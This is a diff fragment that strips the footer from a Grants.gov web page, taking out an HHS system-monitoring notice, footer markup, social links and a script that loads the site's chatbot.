-          <li>The Government may monitor, record, and audit your system usage, including usage of personal devices and email systems for official duties or to conduct HHS business.  Therefore, you have no reasonable expectation of privacy regarding any communication or data transiting or stored on this system.  At any time, and for any lawful Government purpose, the government may monitor, intercept, and search and seize any communication or data transiting or stored on this system. </li>
-          <li>Any communication or data transiting or stored on this system may be disclosed or used for any lawful Government purpose. </li>
-        </ul>
-      </li>
-    </ul>
-</form>
-		</div>
-	<footer class="usa-footer usa-footer--big margin-top-6">
-		<div id="newFooter" class="noPrintBlock">
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.8.0/js/uswds.min.js"></script>
-	
-	<style>
-	footer {
-	    display: block;
-	    width: 100%;
-	}
-	
-	#newFootNav a:link, a:visited {font-size: initial;}
-	</style>
-	
-	<div class="usa-footer__primary-section bg-primary-lighter">
-		<div class="grid-container maxw-full">
-			<div class="grid-row grid-gap">
-				<div class="grid-col-12">
-					<div id="newFootNav"></div>
-				</div><!-- Grid Col 12 -->
-			</div><!-- Grid Row -->
-		</div><!-- Grid Container -->
-    </div>
-        <div id="footbrand">
-            
-            <script type="text/javascript">
-                $(window).bind("load", function () {var fileref=document.createElement('script'); fileref.setAttribute('type','text/javascript'); fileref.setAttribute('src', 'https://prod-grants-gov-chatbot.s3.amazonaws.com/ChatBootstrap2.js'); document.getElementsByTagName('body')[0].appendChild(fileref); });
-				$(window).bind("load", function () {
-					document.getElementById('launch-chat').addEventListener('click', e => {
-					  e.preventDefault();
-					  ([...document.querySelectorAll('*')]
-						.find(el => el.shadowRoot?.getElementById('chat-widget-root'))
-						?.shadowRoot?.querySelector('button') || 0)?.click();
-					});
-				})
-            </script>
-      		
-        </div>
-        <div class="usa-footer__secondary-section bg-primary-dark text-white">
-        	<div class="grid-container maxw-full">
-        		<div class="grid-row grid-gap">
-        			<div class="usa-footer__logo grid-row mobile-lg:grid-col-6 mobile-lg:grid-gap-2">
-        				<div id="logo-footer" class="mobile-lg:grid-col-auto">
-        					<a href="/"><img src="./images/grants-gov-logo-w.png" width="245" height="78" border="0" alt="Click for Home" /></a>
-        				</div>
-        			</div>
-        			<div class="usa-footer__contact-links mobile-lg:grid-col-6">
-        				<div class="usa-footer__social-links grid-row grid-gap-1">
-        					<div class="grid-col-auto">
-        						<a class="usa-social-link" href="https://twitter.com/grantsdotgov"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/twitter.svg" /></a>
-        					</div>
-        					<div class="grid-col-auto">
-        						<a class="usa-social-link" href="https://www.youtube.com/user/GrantsGovUS"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/youtube.svg" /></a>
-        					</div>
-        					<div class="grid-col-auto">
-        						<a class="usa-social-link" href="/apply/spoExit.jsp?p=web/grants/rss.html"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/rss_feed.svg" /></a>
-        					</div>
-        				</div>
-        			</div>
-        		</div>
-        	</div>
-        </div>
-		</div>
-	</footer>	
-	</div><div id="j_idt249" class="ui-blockui-content ui-widget ui-widget-content ui-corner-all ui-helper-hidden ui-shadow"><span style="white-space:nowrap;">Please wait...</span></div><script id="j_idt249_s" type="text/javascript">$(function(){PrimeFaces.cw("BlockUI","blockUI",{id:"j_idt249",block:"entirePage"});});</script></body>
+  </script>
 
+</body>
 </html>
